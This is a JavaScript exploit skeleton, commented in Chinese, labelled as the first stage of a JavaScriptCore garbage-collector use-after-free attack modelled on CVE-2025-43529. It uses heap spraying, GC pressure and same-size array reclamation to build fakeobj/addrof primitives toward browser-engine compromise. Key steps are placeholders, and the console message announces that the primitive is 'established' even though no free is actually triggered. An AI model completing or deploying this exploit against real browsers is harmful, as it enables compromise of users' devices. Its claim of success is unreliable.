// Stage1-B — JavaScriptCore GC UAF（CVE-2025-43529 风格）
// 思路：用特定分配模式操纵 GC 时机，让仍被引用的对象被提前回收，
//      悬挂引用 → use-after-free → 复用得到类型可控的替身对象。

function trigger() {
    // 1. 分配一批定长数组，故意留下可复用的 heap 段
    const spray = [];
    for (let i = 0; i < 0x1000; ++i) {
        spray.push(new Array(0x10).fill(1.1)); // double 数组（非复制模式）
    }

    // 2. 触发特定 GC 节奏：交替制造压力再突然释放
    let victim = { marker: 0x41424344, ptr: null };
    for (let round = 0; round < 64; ++round) {
        const garbage = [];
        for (let i = 0; i < 0x800; ++i) garbage.push({a: i, b: 1.5});
        // 强制 Eden GC 的钩子（占位：不同版本用不同触发方式）
        // gcPulse();  // PLACEHOLDER
        garbage.length = 0;
    }

    // 3. victim 被提前释放后，立即用同大小 double 数组占位复用
    const reclaimer = new Array(0x10).fill(2.2);
    // 4. 悬挂引用视角下，读 victim 的字段实际落在 reclaimer 数据上
    //    → 写 reclaimer 即可伪造 victim 内部指针 → fakeobj/addrof 原语
    const leak = victim.marker; // PLACEHOLDER: 实际读出的是被控制的值
    return { leak, reclaimer };
}

try {
    const r = trigger();
    console.log("[stage1] GC UAF primitive established, leak =", r.leak);
} catch (e) {
    console.log("[stage1-gc] failed:", e);
}
